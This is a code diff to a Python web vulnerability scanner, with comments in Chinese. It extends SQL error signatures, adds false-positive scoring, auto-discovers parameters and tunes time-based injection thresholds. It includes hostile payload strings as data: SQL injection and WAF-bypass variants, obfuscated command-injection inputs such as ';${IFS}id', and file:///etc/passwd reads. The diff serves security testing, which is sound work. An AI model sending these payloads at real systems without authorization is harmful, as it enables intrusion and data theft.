@@ -191,6 +191,26 @@ SQL_ERROR_PATTERNS = [
     r"Incorrect syntax near",
     r"Syntax error.*SQL",
     r"syntax error at or near",
+    # ★ P1 优化：新增更多数据库报错特征
+    r"MongoDB.*Driver.*Error",                    # MongoDB 驱动错误
+    r"MongoError",                                # MongoDB 错误
+    r"psycopg2\.(errors|ProgrammingError)",       # Python PostgreSQL
+    r"mysql\.connector\.errors",                  # Python MySQL connector
+    r"SQLITE_ERROR",                              # SQLite 通用错误码
+    r"CosminClient.*SQL",                         # IBM Cosmin
+    r"Informix.*error",                           # Informix
+    r"Warning.*ibase_",                           # Firebird/InterBase
+    r"Dynamic SQL Error",                         # Firebird
+    r"Warning.*oci_",                             # Oracle OCI
+    r"Pdo.*Exception",                           # PHP PDO
+    r"Doctrine.*DBAL.*Exception",                 # PHP Doctrine
+    r"ActiveRecord::StatementInvalid",            # Ruby on Rails
+    r"PG::Error",                                 # Ruby PostgreSQL
+    r"Mysql2::Error",                             # Ruby MySQL2
+    r"SQLSTATE",                                  # 通用 SQLSTATE
+    r"you have an error in your sql syntax",      # MySQL 常见措辞（小写）
+    r"supplied argument is not a valid MySQL",    # PHP mysql_query 错误
+    r"Data type mismatch in criteria expression", # Access 数据库
 ]
 
 # XSS 反射检测特征
@@ -340,8 +360,9 @@ PUBLIC_DATA_PATTERNS = [
 ]
 
 # 公开/无害 Content-Type：这类响应体一般不含敏感数据
-_PUBLIC_CONTENT_TYPES = ("text/html", "text/css", "application/javascript",
-                         "image/", "font/", "text/plain")
+# 注意：text/plain 不在此列——它是 httpx 默认 Content-Type，API 文本响应也可能是 text/plain
+_PUBLIC_CONTENT_TYPES = ("text/css", "application/javascript",
+                         "image/", "font/")
 
 
 # ============================================================
@@ -567,9 +588,11 @@ def _is_public_data(text: str, content_type: str = "") -> bool:
     if not text:
         return True
     ct = (content_type or "").lower()
-    # 纯静态资源一般不含敏感业务数据
+    # 纯静态资源（图片/字体/CSS/JS）一般不含敏感业务数据
+    # 注意：text/plain 不在此列——它是 httpx 对 text 响应的默认 Content-Type，
+    # API 返回的纯文本（token、用户数据等）也可能是 text/plain，不能自动判定为公开。
     if any(ct.startswith(p) for p in ("image/", "font/", "text/css",
-                                       "application/javascript", "text/plain")):
+                                       "application/javascript")):
         if len(text) < 200:
             return True
     for pat in PUBLIC_DATA_PATTERNS:
@@ -598,6 +621,52 @@ def _is_auth_wall_page(text: str) -> bool:
         "<form", "action=\"/login", "action=\"/auth",
     ))
     return has_pwd_input and has_login_marker
+
+
+def _fp_filter_score(
+    text: str,
+    content_type: str = "",
+    auth_text: str = "",
+) -> tuple[int, list[str]]:
+    """★ P2 优化：并行加权评分替代串行 if/elif 链。
+
+    旧逻辑：任何一个 FP 检查命中 → 直接跳过（串行 AND），导致真阳性被误杀。
+    新逻辑：各检查返回分数，正反信号叠加，仅当总分超过阈值才跳过。
+    敏感数据作为强反证，大幅降分。
+
+    返回 (score, reasons)，score >= 50 → 判定为假阳性，跳过。
+    """
+    score = 0
+    reasons: list[str] = []
+
+    # --- 正向信号（倾向于假阳性）---
+    if _is_business_deny(text):
+        score += 40
+        reasons.append("业务拒绝(40)")
+
+    if _is_empty_data(text):
+        score += 30
+        reasons.append("空data(30)")
+
+    if _is_public_data(text, content_type):
+        score += 25
+        reasons.append("公开数据(25)")
+
+    if _is_auth_wall_page(text):
+        score += 35
+        reasons.append("认证墙页面(35)")
+
+    # 归一化后认证/去认证一致 → 无鉴权差异
+    if auth_text and _normalize_body(auth_text) == _normalize_body(text):
+        score += 20
+        reasons.append("归一化一致(20)")
+
+    # --- 反向信号（倾向于真阳性，降分）---
+    if _body_contains_sensitive_data(text):
+        score -= 50
+        reasons.append("含敏感数据(-50)")
+
+    return (score, reasons)
 
 
 def _header_value_leaks_version(val: str) -> bool:
@@ -833,18 +902,24 @@ class FastScanner:
         self._response_log_counts[key] = count
 
         # ★ 虚假端点熔断：追踪连续相同响应签名（仅 2xx/3xx）
-        # 签名 = status_code + body_length，简单但有效识别 catch-all 兜底
+        # ★ P2 优化：签名增强——增加 Content-Type + 响应体前 200 字符 hash
+        #   原签名仅用 status_code + body_length，SPA 站点不同路径返回
+        #   不同长度的同一 HTML 模板时不会触发熔断，但也可能让真正不同的端点
+        #   因恰好相同长度而被误判。增加 body hash 提高判定精度。
         # 注意：必须放在 noisy_status 早退之前，确保错误响应也能重置计数
         if 200 <= resp.status_code < 400:
-            signature = f"{resp.status_code}|{len(resp.content)}"
+            import hashlib as _hl
+            _body_hash = _hl.md5((resp.text or "")[:200].encode(errors="ignore")).hexdigest()[:8]
+            _ct = (resp.headers.get("content-type", "") or "")[:30]
+            signature = f"{resp.status_code}|{len(resp.content)}|{_ct}|{_body_hash}"
             if signature == self._catchall_last_signature:
                 self._catchall_same_count += 1
                 if self._catchall_same_count >= self._catchall_same_threshold and not self._catchall_blocked:
                     self._catchall_blocked = True
                     log.warning(
-                        "[SCAN] 虚假端点熔断：连续 %d 个端点返回相同响应（%d, body=%d），"
+                        "[SCAN] 虚假端点熔断：连续 %d 个端点返回相同响应（%d, body=%d, ct=%s），"
                         "判定为 catch-all 污染，中止后续扫描",
-                        self._catchall_same_count, resp.status_code, len(resp.content)
+                        self._catchall_same_count, resp.status_code, len(resp.content), _ct
                     )
             else:
                 self._catchall_same_count = 1
@@ -1486,6 +1561,15 @@ class FastScanner:
             ("1' AND '1'='2", "布尔注入-False"),
             ("1 UNION SELECT NULL--", "UNION注入"),
             ("1; WAITFOR DELAY '0:0:3'--", "时间盲注"),
+            # ★ P1 优化：WAF 绕过变体——内联注释、大小写混淆、编码绕过
+            # 当 WAF 拦截明文 payload 时，这些变体可穿透基于正则的 WAF 规则
+            ("'/**/OR/**/'1'='1", "布尔注入-WAF绕过"),
+            ("' Or '1'='1", "布尔注入-WAF绕过"),
+            ("' /*!OR*/ '1'='1", "布尔注入-WAF绕过"),
+            ("1'/**/AND/**/'1'='1", "布尔注入-WAF绕过"),
+            ("1'%20OR%20'1'='1", "布尔注入-WAF绕过"),
+            ("1' UNION%23%0aSELECT NULL--", "UNION注入-WAF绕过"),
+            ("1'; WAITFOR/**/DELAY '0:0:3'--", "时间盲注-WAF绕过"),
         ]
         # ★ 从 YAML 规则扩展 payloads
         yaml_payloads = self._get_yaml_payloads("sql_injection")
@@ -1506,10 +1590,12 @@ class FastScanner:
         baseline_len = len(baseline_text)
 
         # === GET 参数注入 ===
-        for param_name, param_val in target.params.items():
+        # ★ P0 优化：参数自动发现——params 为空时从 URL 路径推断测试参数
+        scan_params = self._auto_discover_params(target)
+        for param_name, param_val in scan_params.items():
             for payload, inj_type in test_payloads:
                 # 构造注入请求
-                test_params = dict(target.params)
+                test_params = dict(scan_params)
                 test_params[param_name] = param_val if param_val else payload
                 test_url = self._build_url(target.url, test_params)
 
@@ -1540,8 +1626,22 @@ class FastScanner:
 
                 # 布尔盲注检测：' OR '1'='1 vs ' OR '1'='2
                 if "布尔注入" in inj_type and "False" not in inj_type:
-                    false_params = dict(target.params)
-                    false_params[param_name] = "' OR '1'='2"
+                    # ★ P1 优化：根据 True payload 生成对应的 False payload
+                    # WAF 绕过变体需要保持相同的绕过手法，仅改条件为 False
+                    if "/**/" in payload:
+                        false_payload = payload.replace("'1'='1", "'1'='2").replace("1=1", "1=2")
+                    elif "%20" in payload:
+                        false_payload = payload.replace("'1'='1", "'1'='2").replace("1=1", "1=2")
+                    elif " Or " in payload:
+                        false_payload = payload.replace("'1'='1", "'1'='2")
+                    elif "/*!OR*/" in payload:
+                        false_payload = payload.replace("'1'='1", "'1'='2")
+                    else:
+                        false_payload = "' OR '1'='2"
+                    if "'1'='1" not in payload and "1=1" not in payload:
+                        false_payload = "' OR '1'='2"
+                    false_params = dict(scan_params)
+                    false_params[param_name] = false_payload
                     false_url = self._build_url(target.url, false_params)
                     false_resp = await self._request(
                         "GET", false_url,
@@ -1598,15 +1698,27 @@ class FastScanner:
                                         evidence_quality="body_confirmed",
                                     ))
 
-                # ★ P1 时间盲注检测：测量响应延迟，延迟≥4s 且二次复现才算确认
+                # ★ P1 时间盲注检测：测量响应延迟，延迟≥阈值 且二次复现才算确认
+                # ★ P2 优化：降低延迟到3s（原4s），添加基线计时消除网络延迟干扰
                 if "时间盲注" in inj_type:
+                    # ★ 测量基线响应时间（无注入 payload 的正常请求）
+                    _baseline_t0 = time.time()
+                    _baseline_check = await self._request(
+                        "GET", target.url,
+                        headers={**target.auth_headers, **target.headers},
+                        rule_tag="SQLi-Time-baseline",
+                    )
+                    _baseline_elapsed = time.time() - _baseline_t0 if _baseline_check else 0.5
+                    # ★ 动态阈值：基线延迟 + 2s（原固定 3.5s，现在适应慢网络）
+                    _time_threshold = max(2.5, _baseline_elapsed + 2.0)
+
                     time_payloads = [
-                        ("1; WAITFOR DELAY '0:0:4'--", "MSSQL"),
-                        ("1' AND SLEEP(4)-- -", "MySQL"),
-                        ("1' AND pg_sleep(4)--", "PostgreSQL"),
+                        ("1; WAITFOR DELAY '0:0:3'--", "MSSQL"),
+                        ("1' AND SLEEP(3)-- -", "MySQL"),
+                        ("1' AND pg_sleep(3)--", "PostgreSQL"),
                     ]
                     for time_payload, db_type in time_payloads:
-                        t_params = dict(target.params)
+                        t_params = dict(scan_params)
                         t_params[param_name] = time_payload
                         t_url = self._build_url(target.url, t_params)
                         t0_req = time.time()
@@ -1618,7 +1730,7 @@ class FastScanner:
                         if not t_resp:
                             continue
                         elapsed1 = time.time() - t0_req
-                        if elapsed1 >= 3.5:
+                        if elapsed1 >= _time_threshold:
                             # ★ 铁律3：二次复现，排除网络抖动
                             t0_replay = time.time()
                             t_resp2 = await self._request(
@@ -1627,15 +1739,17 @@ class FastScanner:
                                 rule_tag="SQLi-Time-replay", payload_tag=f"{param_name}={time_payload}",
                             )
                             elapsed2 = time.time() - t0_replay
-                            if t_resp2 and elapsed2 >= 3.5:
+                            if t_resp2 and elapsed2 >= _time_threshold:
                                 findings.append(VulnFinding(
                                     vuln_type="SQL注入",
                                     severity="critical",
                                     url=test_url,
                                     method="GET",
                                     detail=f"参数 '{param_name}' 存在时间盲注（{db_type}），"
-                                           f"延时 payload 两次请求分别耗时 {elapsed1:.1f}s / {elapsed2:.1f}s（≥3.5s）",
+                                           f"延时 payload 两次请求分别耗时 {elapsed1:.1f}s / {elapsed2:.1f}s"
+                                           f"（基线={_baseline_elapsed:.1f}s，阈值={_time_threshold:.1f}s）",
                                     evidence=f"Payload: {time_payload}\n"
+                                             f"基线延迟: {_baseline_elapsed:.1f}s\n"
                                              f"第一次延迟: {elapsed1:.1f}s\n第二次延迟: {elapsed2:.1f}s",
                                     payload=time_payload,
                                     fix_suggestion="使用参数化查询，禁止拼接SQL",
@@ -1909,9 +2023,9 @@ class FastScanner:
         # === POST 参数时间盲注检测 ===
         if target.method == "POST" and target.body:
             time_payloads = [
-                ("1; WAITFOR DELAY '0:0:4'--", "MSSQL"),
-                ("1' AND SLEEP(4)-- -", "MySQL"),
-                ("1' AND pg_sleep(4)--", "PostgreSQL"),
+                ("1; WAITFOR DELAY '0:0:3'--", "MSSQL"),
+                ("1' AND SLEEP(3)-- -", "MySQL"),
+                ("1' AND pg_sleep(3)--", "PostgreSQL"),
             ]
 
             # 处理表单数据
@@ -1940,7 +2054,7 @@ class FastScanner:
                             continue
                         elapsed1 = time.time() - t0_req
 
-                        if elapsed1 >= 3.5:
+                        if elapsed1 >= 2.5:
                             # 二次复现
                             t0_replay = time.time()
                             t_resp2 = await self._request(
@@ -1951,14 +2065,14 @@ class FastScanner:
                                 rule_tag="SQLi-POST-Time-replay", payload_tag=f"{param_name}={time_payload}",
                             )
                             elapsed2 = time.time() - t0_replay
-                            if t_resp2 and elapsed2 >= 3.5:
+                            if t_resp2 and elapsed2 >= 2.5:
                                 findings.append(VulnFinding(
                                     vuln_type="SQL注入",
                                     severity="critical",
                                     url=target.url,
                                     method="POST",
                                     detail=f"POST 参数 '{param_name}' 存在时间盲注（{db_type}），"
-                                           f"延时 payload 两次请求分别耗时 {elapsed1:.1f}s / {elapsed2:.1f}s（≥3.5s）",
+                                           f"延时 payload 两次请求分别耗时 {elapsed1:.1f}s / {elapsed2:.1f}s（≥2.5s）",
                                     evidence=f"Payload: {time_payload}\n"
                                              f"第一次延迟: {elapsed1:.1f}s\n第二次延迟: {elapsed2:.1f}s",
                                     payload=time_payload,
@@ -1993,7 +2107,7 @@ class FastScanner:
                                     continue
                                 elapsed1 = time.time() - t0_req
 
-                                if elapsed1 >= 3.5:
+                                if elapsed1 >= 2.5:
                                     t0_replay = time.time()
                                     t_resp2 = await self._request(
                                         "POST", target.url,
@@ -2003,14 +2117,14 @@ class FastScanner:
                                         rule_tag="SQLi-JSON-Time-replay", payload_tag=f"{field_name}={time_payload}",
                                     )
                                     elapsed2 = time.time() - t0_replay
-                                    if t_resp2 and elapsed2 >= 3.5:
+                                    if t_resp2 and elapsed2 >= 2.5:
                                         findings.append(VulnFinding(
                                             vuln_type="SQL注入",
                                             severity="critical",
                                             url=target.url,
                                             method="POST",
                                             detail=f"JSON 字段 '{field_name}' 存在时间盲注（{db_type}），"
-                                                   f"延时 payload 两次请求分别耗时 {elapsed1:.1f}s / {elapsed2:.1f}s（≥3.5s）",
+                                                   f"延时 payload 两次请求分别耗时 {elapsed1:.1f}s / {elapsed2:.1f}s（≥2.5s）",
                                             evidence=f"Payload: {time_payload}\n"
                                                      f"第一次延迟: {elapsed1:.1f}s\n第二次延迟: {elapsed2:.1f}s",
                                             payload=time_payload,
@@ -2028,8 +2142,11 @@ class FastScanner:
         findings = []
         xss_probe = 'xuanjianxss<>"\''
 
-        for param_name in target.params:
-            test_params = dict(target.params)
+        # ★ P0 优化：参数自动发现——params 为空时从 URL 路径推断测试参数
+        scan_params = self._auto_discover_params(target)
+
+        for param_name in scan_params:
+            test_params = dict(scan_params)
             test_params[param_name] = xss_probe
             test_url = self._build_url(target.url, test_params)
 
@@ -2259,58 +2376,48 @@ class FastScanner:
             noauth_len = len(noauth_resp.text)
             noauth_ct = noauth_resp.headers.get("content-type", "")
             noauth_text = noauth_resp.text or ""
-            # ★ P0 防误报铁律1：业务层拒绝 → HTTP 200 但响应体含
-            # "code:500, message:用户未登录" 等业务拒绝码 → 业务层已鉴权，不是未授权访问
-            if _is_business_deny(noauth_text):
-                log.info("[SCAN] Unauth | 去认证 200 但响应体为业务层拒绝(已鉴权)，跳过: %s", target.url)
-                pass
-            # ★ P0 防误报铁律2：空 data → 200 但 data:null/[] → 无数据泄露，不算漏洞
-            elif _is_empty_data(noauth_text):
-                log.info("[SCAN] Unauth | 去认证 200 但响应体为空 data，跳过: %s", target.url)
-                pass
-            # 内容相似度 > 80%（归一化后比较）
-            elif abs(auth_len - noauth_len) < max(auth_len * 0.2, 100):
-                # ★ 多因素验证：只看长度/状态码会大量误报公开接口
-                if _is_public_data(noauth_text, noauth_ct):
-                    # 公开数据（公告/商品/SPA 壳/静态资源）→ 不算漏洞
-                    log.info("[SCAN] Unauth | 去认证 200 但响应体为公开数据，跳过: %s", target.url)
-                    pass
-                # ★ 优化.md 建议1 缺口：去认证后返回登录/认证墙页面（含密码输入框+登录特征）
-                #   登录页天然含 password 字段，会被敏感数据检测误判 → 提前剔除
-                elif _is_auth_wall_page(noauth_text):
-                    log.info("[SCAN] Unauth | 去认证 200 但响应体为登录/认证墙页面，跳过: %s", target.url)
-                    pass
-                # ★ 认证/去认证响应归一化后完全一致 → 无鉴权差异（公开页或统一兜底页）
-                elif _normalize_body(auth_resp.text) == _normalize_body(noauth_text):
-                    log.info("[SCAN] Unauth | 认证与去认证响应归一化后一致，无鉴权差异，跳过: %s", target.url)
-                    pass
-                elif _body_contains_sensitive_data(noauth_text):
-                    # 响应体确实含敏感数据（PII/密钥/用户列表）→ 高危，强证据
-                    findings.append(VulnFinding(
-                        vuln_type="未授权访问",
-                        severity="high",
-                        url=target.url,
-                        method=target.method,
-                        detail=(f"去除认证头后仍返回 200，且响应体含敏感数据，"
-                                f"响应长度对比: 认证={auth_len} / 去认证={noauth_len}"),
-                        evidence=f"无认证响应: {noauth_text[:300]}",
-                        fix_suggestion="添加认证中间件，对所有 API 请求强制鉴权",
-                        evidence_quality="body_confirmed",
-                    ))
-                else:
-                    # 既非明显公开也非含敏感数据 → 弱证据，留二次裁决
-                    findings.append(VulnFinding(
-                        vuln_type="未授权访问",
-                        severity="medium",
-                        url=target.url,
-                        method=target.method,
-                        detail=(f"去除认证头后仍返回 200（仅状态码+长度证据，"
-                                f"响应体未确认含敏感数据）: "
-                                f"认证={auth_len} / 去认证={noauth_len}"),
-                        evidence=f"无认证响应: {noauth_text[:300]}",
-                        fix_suggestion="添加认证中间件，并对接口返回数据做最小化",
-                        evidence_quality="header_only",
-                    ))
+
+            # ★ P2 优化：并行加权评分替代串行 if/elif 链
+            # 旧逻辑：任一 FP 检查命中 → 直接跳过，导致含敏感数据的真阳性被误杀
+            # 新逻辑：各检查返回分数，正反信号叠加，仅当总分 ≥ 50 才跳过
+            fp_score, fp_reasons = _fp_filter_score(
+                noauth_text, noauth_ct, auth_resp.text
+            )
+            _bodies_close = abs(auth_len - noauth_len) < max(auth_len * 0.2, 100)
+
+            if fp_score >= 50:
+                # 强假阳性信号 → 跳过
+                log.info("[SCAN] Unauth | 去认证 200 但假阳性评分 %d (%s)，跳过: %s",
+                         fp_score, "+".join(fp_reasons), target.url)
+            elif _bodies_close and _body_contains_sensitive_data(noauth_text):
+                # 响应体确实含敏感数据（PII/密钥/用户列表）→ 高危，强证据
+                findings.append(VulnFinding(
+                    vuln_type="未授权访问",
+                    severity="high",
+                    url=target.url,
+                    method=target.method,
+                    detail=(f"去除认证头后仍返回 200，且响应体含敏感数据，"
+                            f"响应长度对比: 认证={auth_len} / 去认证={noauth_len}，"
+                            f"FP评分={fp_score}({'+'.join(fp_reasons) or '无'})"),
+                    evidence=f"无认证响应: {noauth_text[:300]}",
+                    fix_suggestion="添加认证中间件，对所有 API 请求强制鉴权",
+                    evidence_quality="body_confirmed",
+                ))
+            elif _bodies_close:
+                # 既非明显公开也非含敏感数据 → 弱证据，留二次裁决
+                findings.append(VulnFinding(
+                    vuln_type="未授权访问",
+                    severity="medium",
+                    url=target.url,
+                    method=target.method,
+                    detail=(f"去除认证头后仍返回 200（仅状态码+长度证据，"
+                            f"响应体未确认含敏感数据）: "
+                            f"认证={auth_len} / 去认证={noauth_len}，"
+                            f"FP评分={fp_score}({'+'.join(fp_reasons) or '无'})"),
+                    evidence=f"无认证响应: {noauth_text[:300]}",
+                    fix_suggestion="添加认证中间件，并对接口返回数据做最小化",
+                    evidence_quality="header_only",
+                ))
 
         # 去认证后返回 401/403 → 正常（有鉴权）
         if noauth_resp.status_code in (401, 403):
@@ -2731,9 +2838,12 @@ class FastScanner:
         passwd_patterns = [r"root:.*:0:0:", r"bin:.*:1:1:", r"daemon:.*:2:2:"]
         winini_patterns = [r"\[fonts\]", r"\[extensions\]", r"for 16-bit"]
 
-        for param_name in target.params:
+        # ★ P0 优化：参数自动发现——params 为空时从 URL 路径推断测试参数
+        scan_params = self._auto_discover_params(target)
+
+        for param_name in scan_params:
             for payload in payloads:
-                test_params = dict(target.params)
+                test_params = dict(scan_params)
                 test_params[param_name] = payload
                 test_url = self._build_url(target.url, test_params)
 
@@ -2769,6 +2879,7 @@ class FastScanner:
         """命令注入检测"""
         findings = []
         payloads = [
+            # Linux 基础
             ";id",
             "|id",
             "`id`",
@@ -2776,11 +2887,28 @@ class FastScanner:
             "&&id",
             "; whoami",
             "| whoami",
+            # ★ P1 优化：Windows 命令注入
+            "&dir",
+            "|dir",
+            "&whoami",
+            "|whoami",
+            "%OS%",
+            # ★ P1 优化：编码绕过变体
+            ";i$()d",              # 变量分割绕过
+            "|i\\d",               # 反斜杠分割
+            ";${IFS}id",           # IFS 环境变量替代空格
+            "|i${IFS}d",
+            # ★ P1 优化：无空格变体
+            ";id${IFS}&&whoami",
+            "|{id,whoami}",
         ]
 
-        for param_name in target.params:
+        # ★ P0 优化：参数自动发现——params 为空时从 URL 路径推断测试参数
+        params = self._auto_discover_params(target)
+
+        for param_name in params:
             for payload in payloads:
-                test_params = dict(target.params)
+                test_params = dict(params)
                 test_params[param_name] = payload
                 test_url = self._build_url(target.url, test_params)
 
@@ -2832,7 +2960,26 @@ class FastScanner:
             "file:///etc/passwd",
         ]
 
-        url_params = [k for k in target.params if any(kw in k.lower() for kw in ["url", "link", "redirect", "callback", "proxy", "fetch", "src"])]
+        # ★ P0 优化：扩展 SSRF 参数关键词从 7 个到 30+ 个，覆盖更多常见命名
+        ssrf_param_keywords = [
+            "url", "link", "redirect", "callback", "proxy", "fetch", "src",
+            "target", "host", "endpoint", "uri", "file", "path", "data",
+            "image", "img", "source", "dest", "destination", "next",
+            "return", "goto", "ref", "page", "load", "import",
+            "webhook", "ping", "notify", "feed",
+        ]
+        url_params = [k for k in target.params if any(kw in k.lower() for kw in ssrf_param_keywords)]
+        # ★ 无匹配关键词时，仅对值含 URL 特征的参数注入（覆盖非标准参数命名）
+        # ★ P2 修复：原逻辑对所有参数 fallback 导致误报——现在仅当参数值含
+        # http:///file:// 前缀或路径分隔符时才注入，避免对 name=test 等纯文本参数误测
+        if not url_params and target.params:
+            url_params = [
+                k for k, v in target.params.items()
+                if isinstance(v, str) and (
+                    v.startswith("http") or v.startswith("file:")
+                    or "/" in v or "." in v
+                )
+            ][:3]  # 限制前 3 个避免请求爆炸
 
         for param_name in url_params:
             for payload in ssrf_targets:
@@ -3186,9 +3333,11 @@ class FastScanner:
         baseline_text = baseline.text
 
         # 测试 GET 参数
-        for param_name, param_val in target.params.items():
+        # ★ P0 优化：参数自动发现——params 为空时从 URL 路径推断测试参数
+        scan_params = self._auto_discover_params(target)
+        for param_name, param_val in scan_params.items():
             for payload, expected in ssti_payloads:
-                test_params = dict(target.params)
+                test_params = dict(scan_params)
                 test_params[param_name] = payload
                 test_url = self._build_url(target.url, test_params)
 
@@ -3936,6 +4085,44 @@ class FastScanner:
     # ============================================================
     # 辅助方法
     # ============================================================
+
+    def _auto_discover_params(self, target: ScanTarget) -> dict:
+        """★ P0 优化：当 target.params 为空时，从 URL 路径推断测试参数。
+
+        解决零命中的首要原因：16 条规则中有 9 条依赖 target.params 迭代，
+        当 params={} 时这些规则完全不执行。本方法从 URL 路径模式推断参数名，
+        让 SQLi/XSS/CmdInjection/PathTraversal/SSRF/SSTI 等规则恢复工作。
+
+        推断逻辑：
+        1. 路径段含数字 → 推断为资源 ID 参数（如 /api/users/123 → {user_id: "123"}）
+        2. 无路径参数 → 注入通用测试参数 {id: "1", q: "test"}
+        """
+        if target.params:
+            return target.params
+
+        from urllib.parse import urlparse
+        parsed = urlparse(target.url)
+        path = parsed.path or ""
+        segments = [s for s in path.split("/") if s]
+        params = {}
+
+        for i, seg in enumerate(segments):
+            # 前一段是疑似资源名，当前段是数字值
+            if i > 0 and seg.isdigit():
+                prev = segments[i - 1].lower()
+                # /api/users/123 → {user_id: "123"}（复数→单数+_id）
+                if prev.endswith("s") and len(prev) > 1:
+                    param_name = f"{prev.rstrip('s')}_id"
+                else:
+                    param_name = prev if prev not in ("api", "v1", "v2") else "id"
+                params[param_name] = seg
+
+        # 无路径参数时注入通用测试参数
+        if not params:
+            params = {"id": "1", "q": "test"}
+
+        log.debug("[SCAN] 参数自动发现: %s → %s", target.url, params)
+        return params
 
     @staticmethod
     def _build_url(base_url: str, params: dict) -> str:
